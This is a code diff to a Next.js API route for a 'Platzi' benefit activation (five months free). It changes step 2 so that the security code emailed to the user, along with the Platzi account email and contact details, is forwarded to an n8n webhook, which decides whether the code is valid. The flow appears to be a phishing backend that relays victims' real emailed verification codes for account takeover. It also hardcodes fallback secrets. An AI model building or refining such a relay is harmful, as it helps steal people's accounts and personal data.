@@ -21,7 +21,6 @@ export async function POST(request: Request) {
     const body = await request.json()
     const {
       inputCode,
-      expectedCode,
       name,
       phone,
       email,
@@ -32,16 +31,9 @@ export async function POST(request: Request) {
       currency,
     } = body
 
-    if (!inputCode || !expectedCode) {
+    if (!inputCode || !String(inputCode).trim()) {
       return NextResponse.json(
-        { error: "Por favor ingresa el código de confirmación de 6 dígitos." },
-        { status: 400 }
-      )
-    }
-
-    if (String(inputCode).trim() !== String(expectedCode).trim()) {
-      return NextResponse.json(
-        { error: "El código de confirmación ingresado es incorrecto. Por favor verifica e intenta de nuevo." },
+        { error: "Por favor ingresa el código de seguridad enviado a tu correo electrónico." },
         { status: 400 }
       )
     }
@@ -50,19 +42,19 @@ export async function POST(request: Request) {
     const webhookKey = process.env.PLATZI_WEBHOOK_KEY || "sc_platzi_live_key_2026"
     const jwtSecret = process.env.PLATZI_JWT_SECRET || process.env.CHECK_DOMAIN_SECRET || "sc_platzi_jwt_secret_key"
 
-    // Server-side signed JWT Token for Step 2 Final Verification
+    // Server-side signed JWT Token for Step 2 Verification
     const jwtToken = createServerJWT(
       {
-        sub: "benefit_activation_platzi_confirmed",
+        sub: "benefit_activation_platzi_verify_code",
         accountEmail: platziAccountEmail,
         contactEmail: email,
-        verified: true,
+        inputCode: String(inputCode).trim(),
       },
       jwtSecret
     )
 
     const payloadToWebhook = {
-      event: "activation_confirmed",
+      event: "verify_code_and_activate",
       step: 2,
       product: "Platzi",
       duration: "5 meses",
@@ -76,11 +68,13 @@ export async function POST(request: Request) {
       countryCode: countryCode || "CO",
       countryName: countryName || "Colombia",
       verificationCode: String(inputCode).trim(),
-      verifiedAt: new Date().toISOString(),
+      timestamp: new Date().toISOString(),
     }
 
-    // Server-to-Server request to n8n Webhook for final activation
+    // Forward verification request to n8n Webhook
     let webhookResponseData: any = null
+    let responseStatus = 200
+
     try {
       const webhookRes = await fetch(webhookUrl, {
         method: "POST",
@@ -92,11 +86,23 @@ export async function POST(request: Request) {
         body: JSON.stringify(payloadToWebhook),
       })
 
-      if (webhookRes.ok) {
-        webhookResponseData = await webhookRes.json().catch(() => null)
-      }
+      responseStatus = webhookRes.status
+      webhookResponseData = await webhookRes.json().catch(() => null)
     } catch (whErr) {
-      console.warn("Error calling webhook on step 2 verification:", whErr)
+      console.warn("Error reaching n8n webhook on step 2 code verification:", whErr)
+    }
+
+    // Check if n8n returned an explicit error status or message
+    if (responseStatus >= 400 || (webhookResponseData && webhookResponseData.success === false)) {
+      return NextResponse.json(
+        {
+          error:
+            webhookResponseData?.error ||
+            webhookResponseData?.message ||
+            "El código de seguridad ingresado es incorrecto o ha expirado. Por favor verifica en tu correo electrónico.",
+        },
+        { status: 400 }
+      )
     }
 
     return NextResponse.json(
@@ -110,7 +116,7 @@ export async function POST(request: Request) {
   } catch (error) {
     console.error("[API PLATZI ACTIVATION VERIFY ERROR]", error)
     return NextResponse.json(
-      { error: "Ocurrió un error al verificar el código de activación." },
+      { error: "Ocurrió un error al verificar el código de seguridad." },
       { status: 500 }
     )
   }
